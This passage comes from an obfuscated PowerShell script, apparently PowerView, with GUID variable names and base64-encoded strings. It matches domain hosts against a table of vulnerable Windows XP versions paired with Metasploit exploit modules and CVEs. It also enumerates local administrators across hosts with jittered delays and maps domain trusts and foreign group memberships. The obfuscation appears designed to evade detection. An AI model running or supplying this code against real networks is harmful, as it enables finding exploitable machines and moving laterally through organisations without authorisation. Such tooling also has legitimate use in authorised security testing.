    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA'))))  
    $Null = ${8a58d1348c7d42029e8592b98fd4e332}.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFgAUAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA'))))  
    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAqAF0AIABDAGgAZQBjAGsAaQBuAGcAIABjAG8AbQBwAHUAdABlAHIAcwAgAGYAbwByACAAdgB1AGwAbgBlAHIAYQBiAGwAZQAgAE8AUwAgAGEAbgBkACAAUwBQACAAbABlAHYAZQBsAHMALgAuAC4A')))
    ${b2ec203890f54038bb6f3dc41b7e6551} = New-Object System.Data.DataTable 
    $Null = ${b2ec203890f54038bb6f3dc41b7e6551}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))))
    $Null = ${b2ec203890f54038bb6f3dc41b7e6551}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A'))))
    $Null = ${b2ec203890f54038bb6f3dc41b7e6551}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA=='))))
    $Null = ${b2ec203890f54038bb6f3dc41b7e6551}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABhAHMAdABMAG8AZwBvAG4A'))))
    $Null = ${b2ec203890f54038bb6f3dc41b7e6551}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBzAGYATQBvAGQAdQBsAGUA'))))
    $Null = ${b2ec203890f54038bb6f3dc41b7e6551}.Columns.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBWAEUA'))))
    ${8a58d1348c7d42029e8592b98fd4e332} | % {
        ${0bb97e65beb5433ca5382171349940f6} = $_.OperatingSystem
        ${57510cc5cf0c42eeb5bae5bd78dbd160} = $_.ServicePack
        ${0aac545243f2438fbe483d80913ec3bf} = $_.MsfModule
        ${5ca27487ba9d45cf93f4281d392ae3b2} = $_.CVE
        ${b7c7dc72fa2f4131a9fd6375f270ed88} | % {
            ${adc0631ab90541e195fc06db59b8e4a7} = $_.Hostname
            ${91dcd7941299423eb02290d9c6b3ac50} = $_.OperatingSystem
            ${a2a49411d1b44af98e462b902ac8b009} = $_.ServicePack                                                        
            ${b561704708a94f1a9541b20ce3a8dd78} = $_.LastLogon
            if (${91dcd7941299423eb02290d9c6b3ac50} -like "${0bb97e65beb5433ca5382171349940f6}*" -and ${a2a49411d1b44af98e462b902ac8b009} -like "${57510cc5cf0c42eeb5bae5bd78dbd160}" ) {                    
                $Null = ${b2ec203890f54038bb6f3dc41b7e6551}.Rows.Add(${adc0631ab90541e195fc06db59b8e4a7},${91dcd7941299423eb02290d9c6b3ac50},${a2a49411d1b44af98e462b902ac8b009},${b561704708a94f1a9541b20ce3a8dd78},${0aac545243f2438fbe483d80913ec3bf},${5ca27487ba9d45cf93f4281d392ae3b2})
            }
        }
    }     
    ${fbe868fc6394447cbcbb9ef38ccc044f} = ${b2ec203890f54038bb6f3dc41b7e6551} | select ComputerName -Unique | measure
    ${5cc85bd1b1fc4ccf9af9c35a528d61c2} = ${fbe868fc6394447cbcbb9ef38ccc044f}.Count
    if (${fbe868fc6394447cbcbb9ef38ccc044f}.Count -gt 0) {
        Write-Verbose "[+] Found ${5cc85bd1b1fc4ccf9af9c35a528d61c2} potentially vulnerable systems!"
        ${b2ec203890f54038bb6f3dc41b7e6551} | sort { $_.lastlogon -as [datetime]} -Descending
    }
    else {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABOAG8AIAB2AHUAbABuAGUAcgBhAGIAbABlACAAcwB5AHMAdABlAG0AcwAgAHcAZQByAGUAIABmAG8AdQBuAGQALgA=')))
    }
}
function Invoke-EnumerateLocalAdmin {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        ${c096522c7bbe4c7aaadf99843e3b09fb},
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        ${b58b7e66c34147d0b1030dea35e43084},
        [String]
        ${a2fbc6e3cd88453ea35f8017927b51ae},
        [String]
        ${c4ea8c745d00425ab685ca6107c29659},
        [Switch]
        ${e6e5f48677934e8a9b673971d54cb88b},
        [UInt32]
        ${b8c8aa64938b4bac902fc98afa97c067} = 0,
        [Double]
        ${d4ce8c8227174786a6c6642ad7a1cbfb} = .3,
        [String]
        ${a3653a86a8bf4a758cfe5d1942c0bcde},
        [Switch]
        ${bc80c7c347ff4aac8ae95d547f4293ec},
        [Switch]
        ${c55952cb63054e439f30e421f2356bb4},
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [Switch]
        ${e9a66cc9388c4a9b8dd06d6ed60e1b0f},
        [ValidateRange(1,100)] 
        [Int]
        ${af65be9c26e74dca807a99d4facf1a11}
    )
    begin {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))]) {
            $DebugPreference = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
        }
        ${a000573bb5614405b8a5a68467724c29} = New-Object System.Random
        Write-Verbose "[*] Running Invoke-EnumerateLocalAdmin with delay of ${b8c8aa64938b4bac902fc98afa97c067}"
        if(!${c096522c7bbe4c7aaadf99843e3b09fb}) { 
            if(${afa30c601e734738b32424a6234484e4}) {
                ${575c90e058ca4f27b93edf3f2aea5074} = @(${afa30c601e734738b32424a6234484e4})
            }
            elseif(${e9a66cc9388c4a9b8dd06d6ed60e1b0f}) {
                ${575c90e058ca4f27b93edf3f2aea5074} = Get-NetForestDomain | % { $_.Name }
            }
            else {
                ${575c90e058ca4f27b93edf3f2aea5074} = @( (Get-NetDomain).name )
            }
            if(${b58b7e66c34147d0b1030dea35e43084}) {
                ${c096522c7bbe4c7aaadf99843e3b09fb} = gc -Path ${b58b7e66c34147d0b1030dea35e43084}
            }
            else {
                [array]${c096522c7bbe4c7aaadf99843e3b09fb} = @()
                ForEach (${afa30c601e734738b32424a6234484e4} in ${575c90e058ca4f27b93edf3f2aea5074}) {
                    Write-Verbose "[*] Querying domain ${afa30c601e734738b32424a6234484e4} for hosts"
                    ${c096522c7bbe4c7aaadf99843e3b09fb} += Get-NetComputer -a48507564a8248e5b01d3a563f4bc865 ${a2fbc6e3cd88453ea35f8017927b51ae} -c4d5e29aa5ae43dc97a75d43cbc64f02 ${c4ea8c745d00425ab685ca6107c29659} -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624}
                }
            }
            ${c096522c7bbe4c7aaadf99843e3b09fb} = ${c096522c7bbe4c7aaadf99843e3b09fb} | ? { $_ } | sort -Unique | sort { Get-Random }
            if($(${c096522c7bbe4c7aaadf99843e3b09fb}.Count) -eq 0) {
                throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACEA')))
            }
        }
        if(!${bc80c7c347ff4aac8ae95d547f4293ec}) {
            if (${a3653a86a8bf4a758cfe5d1942c0bcde} -and (Test-Path -Path ${a3653a86a8bf4a758cfe5d1942c0bcde})) { rd -Path ${a3653a86a8bf4a758cfe5d1942c0bcde} }
        }
        if(${c55952cb63054e439f30e421f2356bb4}) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHQAZQByAG0AaQBuAGkAbgBnACAAZABvAG0AYQBpAG4AIAB0AHIAdQBzAHQAIABnAHIAbwB1AHAAcwA=')))
            ${ecaf27558b84450a8534705bfb4ea7f2} = Find-ForeignGroup -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} | % { $_.GroupName } | sort -Unique
            ${87ff753a1bf743018656e856dbc06754} = ${ecaf27558b84450a8534705bfb4ea7f2} | % { 
                Get-NetGroup -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -a0852a4c33684bf0877105c6da3a9074 $_ -c489e407a44b4d378d17e6f8021054c1 | ? { $_.objectsid -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA'))) } | % { $_.objectsid }
            }
            ${2590a9f718e54db2a9d598a9b43c8cff} = Get-DomainSID -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4}
        }
        ${59a37d6213694042882ad9072c1f5a73} = {
            param(${c096522c7bbe4c7aaadf99843e3b09fb}, ${be0265651b1f4b6699aaa7db34ab7aee}, ${a3653a86a8bf4a758cfe5d1942c0bcde}, ${2590a9f718e54db2a9d598a9b43c8cff}, ${87ff753a1bf743018656e856dbc06754})
            ${4ec9c050c4c74ff6a6d4be971e455652} = $True
            if(${be0265651b1f4b6699aaa7db34ab7aee}) {
                ${4ec9c050c4c74ff6a6d4be971e455652} = Test-Connection -Count 1 -Quiet -ComputerName ${c096522c7bbe4c7aaadf99843e3b09fb}
            }
            if(${4ec9c050c4c74ff6a6d4be971e455652}) {
                ${10fd880b0fb64c3c95f595968e39c05c} = Get-NetLocalGroup -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb}
                if(${2590a9f718e54db2a9d598a9b43c8cff} -and $TrustGroupSIDS) {
                    ${7d77ae4ef4164464be811769bc637da5} = (${10fd880b0fb64c3c95f595968e39c05c} | ? { $_.SID -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgAqAC0ANQAwADAAJAA='))) }).SID -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQA1ADAAMAAkAA==')))
                    ${10fd880b0fb64c3c95f595968e39c05c} = ${10fd880b0fb64c3c95f595968e39c05c} | ? { (${87ff753a1bf743018656e856dbc06754} -contains $_.SID) -or ((-not $_.SID.startsWith(${7d77ae4ef4164464be811769bc637da5})) -and (-not $_.SID.startsWith(${2590a9f718e54db2a9d598a9b43c8cff}))) }
                }
                if(${10fd880b0fb64c3c95f595968e39c05c} -and (${10fd880b0fb64c3c95f595968e39c05c}.Length -ne 0)) {
                    if(${a3653a86a8bf4a758cfe5d1942c0bcde}) {
                        ${10fd880b0fb64c3c95f595968e39c05c} | Export-PowerViewCSV -a3653a86a8bf4a758cfe5d1942c0bcde ${a3653a86a8bf4a758cfe5d1942c0bcde}
                    }
                    else {
                        ${10fd880b0fb64c3c95f595968e39c05c}
                    }
                }
                else {
                    Write-Verbose "[!] No users returned from $Server"
                }
            }
        }
    }
    process {
        if(${af65be9c26e74dca807a99d4facf1a11}) {
            Write-Verbose "Using threading with threads = ${af65be9c26e74dca807a99d4facf1a11}"
            ${9bbea18b6b074c14aeae828437f12380} = @{
                'Ping' = $(-not ${e6e5f48677934e8a9b673971d54cb88b})
                'OutFile' = ${a3653a86a8bf4a758cfe5d1942c0bcde}
                'DomainSID' = ${2590a9f718e54db2a9d598a9b43c8cff}
                'TrustGroupsSIDs' = ${87ff753a1bf743018656e856dbc06754}
            }
            Invoke-ThreadedFunction -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb} -ba541df15a284a3187207310217a6e04 ${59a37d6213694042882ad9072c1f5a73} -eeeefbd7f1ac43118ed9ac4a4cb9dd01 ${9bbea18b6b074c14aeae828437f12380}
        }
        else {
            if(-not ${e6e5f48677934e8a9b673971d54cb88b} -and (${c096522c7bbe4c7aaadf99843e3b09fb}.count -ne 1)) {
                ${be0265651b1f4b6699aaa7db34ab7aee} = {param(${c096522c7bbe4c7aaadf99843e3b09fb}) if(Test-Connection -ComputerName ${c096522c7bbe4c7aaadf99843e3b09fb} -Count 1 -Quiet -ErrorAction Stop){${c096522c7bbe4c7aaadf99843e3b09fb}}}
                ${c096522c7bbe4c7aaadf99843e3b09fb} = Invoke-ThreadedFunction -e0be29f777aa4bc98faa14015f17190f -c096522c7bbe4c7aaadf99843e3b09fb ${c096522c7bbe4c7aaadf99843e3b09fb} -ba541df15a284a3187207310217a6e04 ${be0265651b1f4b6699aaa7db34ab7aee} -af65be9c26e74dca807a99d4facf1a11 100
            }
            Write-Verbose "[*] Total number of active hosts: $(${c096522c7bbe4c7aaadf99843e3b09fb}.count)"
            ${6a1d2d10aeb941458787cbe1335cc6ce} = 0
            ForEach (${5c10572590774a67ad57cb4f99935a3e} in ${c096522c7bbe4c7aaadf99843e3b09fb}) {
                ${6a1d2d10aeb941458787cbe1335cc6ce} = ${6a1d2d10aeb941458787cbe1335cc6ce} + 1
                sleep -Seconds ${a000573bb5614405b8a5a68467724c29}.Next((1-${d4ce8c8227174786a6c6642ad7a1cbfb})*${b8c8aa64938b4bac902fc98afa97c067}, (1+${d4ce8c8227174786a6c6642ad7a1cbfb})*${b8c8aa64938b4bac902fc98afa97c067})
                Write-Verbose "[*] Enumerating server ${5c10572590774a67ad57cb4f99935a3e} (${6a1d2d10aeb941458787cbe1335cc6ce} of $(${c096522c7bbe4c7aaadf99843e3b09fb}.count))"
                icm -ScriptBlock ${59a37d6213694042882ad9072c1f5a73} -ArgumentList ${5c10572590774a67ad57cb4f99935a3e}, $False, ${a3653a86a8bf4a758cfe5d1942c0bcde}, ${2590a9f718e54db2a9d598a9b43c8cff}, ${87ff753a1bf743018656e856dbc06754}
            }
        }
    }
}
function Get-NetDomainTrust {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        ${afa30c601e734738b32424a6234484e4} = (Get-NetDomain).Name,
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [Switch]
        ${e22191a1db5b4c5bba42c2b9674b00a8},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    process {
        if(${e22191a1db5b4c5bba42c2b9674b00a8} -or ${a3bf4f2494234d89b62febc9f379f624}) {
            ${a697f137a9554bba9701af293c84918c} = Get-DomainSearcher -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
            if(${a697f137a9554bba9701af293c84918c}) {
                ${a697f137a9554bba9701af293c84918c}.filter = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBsAGEAcwBzAD0AdAByAHUAcwB0AGUAZABEAG8AbQBhAGkAbgApACkA')))
                ${a697f137a9554bba9701af293c84918c}.FindAll() | ? {$_} | % {
                    ${d244ae3fff3d438fab0e2dbd2fa1f02f} = $_.Properties
                    ${a2e6c957d163423ea4acfe196f8e4ec4} = New-Object PSObject
                    ${8ca9d422c4fc41f982e3c93c39f45e5f} = Switch (${d244ae3fff3d438fab0e2dbd2fa1f02f}.trustattributes)
                    {
                        0x001 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBvAG4AXwB0AHIAYQBuAHMAaQB0AGkAdgBlAA=='))) }
                        0x002 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBwAGwAZQB2AGUAbABfAG8AbgBsAHkA'))) }
                        0x004 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cQB1AGEAcgBhAG4AdABpAG4AZQBkAF8AZABvAG0AYQBpAG4A'))) }
                        0x008 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBvAHIAZQBzAHQAXwB0AHIAYQBuAHMAaQB0AGkAdgBlAA=='))) }
                        0x010 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAG8AcwBzAF8AbwByAGcAYQBuAGkAegBhAHQAaQBvAG4A'))) }
                        0x020 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBpAHQAaABpAG4AXwBmAG8AcgBlAHMAdAA='))) }
                        0x040 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAGUAYQB0AF8AYQBzAF8AZQB4AHQAZQByAG4AYQBsAA=='))) }
                        0x080 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAHUAcwB0AF8AdQBzAGUAcwBfAHIAYwA0AF8AZQBuAGMAcgB5AHAAdABpAG8AbgA='))) }
                        0x100 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAHUAcwB0AF8AdQBzAGUAcwBfAGEAZQBzAF8AawBlAHkAcwA='))) }
                        Default { 
                            Write-Warning "Unknown trust attribute: $(${d244ae3fff3d438fab0e2dbd2fa1f02f}.trustattributes)";
                            "$(${d244ae3fff3d438fab0e2dbd2fa1f02f}.trustattributes)";
                        }
                    }
                    ${e5e8d77ba43740b18bcacbbd353b25a8} = Switch (${d244ae3fff3d438fab0e2dbd2fa1f02f}.trustdirection) {
                        0 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBiAGwAZQBkAA=='))) }
                        1 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGIAbwB1AG4AZAA='))) }
                        2 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAYgBvAHUAbgBkAA=='))) }
                        3 { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBpAGQAaQByAGUAYwB0AGkAbwBuAGEAbAA='))) }
                    }
                    ${ce6a247b2073410d85cf7e7a75d85e14} = New-Object Guid @(,${d244ae3fff3d438fab0e2dbd2fa1f02f}.objectguid[0])
                    ${a2e6c957d163423ea4acfe196f8e4ec4} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUATgBhAG0AZQA='))) ${afa30c601e734738b32424a6234484e4}
                    ${a2e6c957d163423ea4acfe196f8e4ec4} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATgBhAG0AZQA='))) ${d244ae3fff3d438fab0e2dbd2fa1f02f}.name[0]
                    ${a2e6c957d163423ea4acfe196f8e4ec4} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARwB1AGkAZAA='))) "{${ce6a247b2073410d85cf7e7a75d85e14}}"
                    ${a2e6c957d163423ea4acfe196f8e4ec4} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AFQAeQBwAGUA'))) "${8ca9d422c4fc41f982e3c93c39f45e5f}"
                    ${a2e6c957d163423ea4acfe196f8e4ec4} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AEQAaQByAGUAYwB0AGkAbwBuAA=='))) "${e5e8d77ba43740b18bcacbbd353b25a8}"
                    ${a2e6c957d163423ea4acfe196f8e4ec4}
                }
            }
        }
        else {
            ${7c91682d6c48459fa2349d85055ca9e2} = Get-NetDomain -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4}
            if(${7c91682d6c48459fa2349d85055ca9e2}) {
                (Get-NetDomain -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4}).GetAllTrustRelationships()
            }     
        }
    }
}
function Get-NetForestTrust {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        ${b269a228f63c4b8fa8e609dcda3cbb66}
    )
    process {
        ${f8adbed031774e6aaadaa5653e6c4b9c} = Get-NetForest -b269a228f63c4b8fa8e609dcda3cbb66 ${b269a228f63c4b8fa8e609dcda3cbb66}
        if(${f8adbed031774e6aaadaa5653e6c4b9c}) {
            ${f8adbed031774e6aaadaa5653e6c4b9c}.GetAllTrustRelationships()
        }
    }
}
function Find-ForeignUser {
    [CmdletBinding()]
    param(
        [String]
        ${dfa85e24773f431f91e73de068d7b94e},
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [Switch]
        ${e22191a1db5b4c5bba42c2b9674b00a8},
        [Switch]
        ${d722399685d842b19fa5d48261792164},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    function Get-ForeignUser {
        param(
            [String]
            ${dfa85e24773f431f91e73de068d7b94e},
            [String]
            ${afa30c601e734738b32424a6234484e4},
            [String]
            ${a3bf4f2494234d89b62febc9f379f624},
            [ValidateRange(1,10000)] 
            [Int]
            ${c8e7665cd4cc41d88229c3536a114f1b} = 200
        )
        if (${afa30c601e734738b32424a6234484e4}) {
            ${892dfdbaf9c14845b6323b5ba1cadf64} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))) + ${afa30c601e734738b32424a6234484e4} -replace '\.',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABEAEMAPQA=')))
        }
        else {
            ${892dfdbaf9c14845b6323b5ba1cadf64} = [String] ([adsi]'').distinguishedname
            ${afa30c601e734738b32424a6234484e4} = ${892dfdbaf9c14845b6323b5ba1cadf64} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
        }
        Get-NetUser -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -dfa85e24773f431f91e73de068d7b94e ${dfa85e24773f431f91e73de068d7b94e} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b} | ? {$_.memberof} | % {
            ForEach ($Membership in $_.memberof) {
                ${7fa129629b044e1fbb306f4e8521ac0a} = $Membership.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))
                if(${7fa129629b044e1fbb306f4e8521ac0a}) {
                    ${61053a7a47cd4b9993358f78e98aa5a3} = $($Membership.substring(${7fa129629b044e1fbb306f4e8521ac0a})) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                    if (${61053a7a47cd4b9993358f78e98aa5a3}.CompareTo(${afa30c601e734738b32424a6234484e4})) {
                        ${a0852a4c33684bf0877105c6da3a9074} = $Membership.split(",")[0].split("=")[1]
                        ${03f01bc30b5e40a6a7647725a142b390} = New-Object PSObject
                        ${03f01bc30b5e40a6a7647725a142b390} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) ${afa30c601e734738b32424a6234484e4}
                        ${03f01bc30b5e40a6a7647725a142b390} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $_.samaccountname
                        ${03f01bc30b5e40a6a7647725a142b390} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) ${61053a7a47cd4b9993358f78e98aa5a3}
                        ${03f01bc30b5e40a6a7647725a142b390} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${a0852a4c33684bf0877105c6da3a9074}
                        ${03f01bc30b5e40a6a7647725a142b390} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQATgA='))) $Membership
                        ${03f01bc30b5e40a6a7647725a142b390}
                    }
                }
            }
        }
    }
    if (${d722399685d842b19fa5d48261792164}) {
        if(${e22191a1db5b4c5bba42c2b9674b00a8} -or ${a3bf4f2494234d89b62febc9f379f624}) {
            ${0638207c3e9f40e88fc70c3498e54206} = Invoke-MapDomainTrust -e22191a1db5b4c5bba42c2b9674b00a8 -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b} | % { $_.SourceDomain } | sort -Unique
        }
        else {
            ${0638207c3e9f40e88fc70c3498e54206} = Invoke-MapDomainTrust -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b} | % { $_.SourceDomain } | sort -Unique
        }
        ForEach(${a2e6c957d163423ea4acfe196f8e4ec4} in ${0638207c3e9f40e88fc70c3498e54206}) {
            Write-Verbose "Enumerating trust groups in domain ${a2e6c957d163423ea4acfe196f8e4ec4}"
            Get-ForeignUser -afa30c601e734738b32424a6234484e4 ${a2e6c957d163423ea4acfe196f8e4ec4} -dfa85e24773f431f91e73de068d7b94e ${dfa85e24773f431f91e73de068d7b94e} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
        }
    }
    else {
        Get-ForeignUser -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -dfa85e24773f431f91e73de068d7b94e ${dfa85e24773f431f91e73de068d7b94e} -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b}
    }
}
function Find-ForeignGroup {
    [CmdletBinding()]
    param(
        [String]
        ${a0852a4c33684bf0877105c6da3a9074} = '*',
        [String]
        ${afa30c601e734738b32424a6234484e4},
        [String]
        ${a3bf4f2494234d89b62febc9f379f624},
        [Switch]
        ${e22191a1db5b4c5bba42c2b9674b00a8},
        [Switch]
        ${d722399685d842b19fa5d48261792164},
        [ValidateRange(1,10000)] 
        [Int]
        ${c8e7665cd4cc41d88229c3536a114f1b} = 200
    )
    function Get-ForeignGroup {
        param(
            [String]
            ${a0852a4c33684bf0877105c6da3a9074} = '*',
            [String]
            ${afa30c601e734738b32424a6234484e4},
            [String]
            ${a3bf4f2494234d89b62febc9f379f624},
            [ValidateRange(1,10000)] 
            [Int]
            ${c8e7665cd4cc41d88229c3536a114f1b} = 200
        )
        if(-not ${afa30c601e734738b32424a6234484e4}) {
            ${afa30c601e734738b32424a6234484e4} = (Get-NetDomain).Name
        }
        ${d33ca5a859b64a65a2a6e11c35c88764} = "DC=$(${afa30c601e734738b32424a6234484e4}.Replace('.', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABEAEMAPQA=')))))"
        Write-Verbose "DomainDN: ${d33ca5a859b64a65a2a6e11c35c88764}"
        ${4ddba7a37af34c91ad3ed60aee04bc0c} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBzAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AIABVAHMAZQByAHMA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwB1AGUAcwB0AHMA'))))
        Get-NetGroup -a0852a4c33684bf0877105c6da3a9074 ${a0852a4c33684bf0877105c6da3a9074} -afa30c601e734738b32424a6234484e4 ${afa30c601e734738b32424a6234484e4} -a3bf4f2494234d89b62febc9f379f624 ${a3bf4f2494234d89b62febc9f379f624} -c489e407a44b4d378d17e6f8021054c1 -c8e7665cd4cc41d88229c3536a114f1b ${c8e7665cd4cc41d88229c3536a114f1b} | ? {$_.member} | ? {
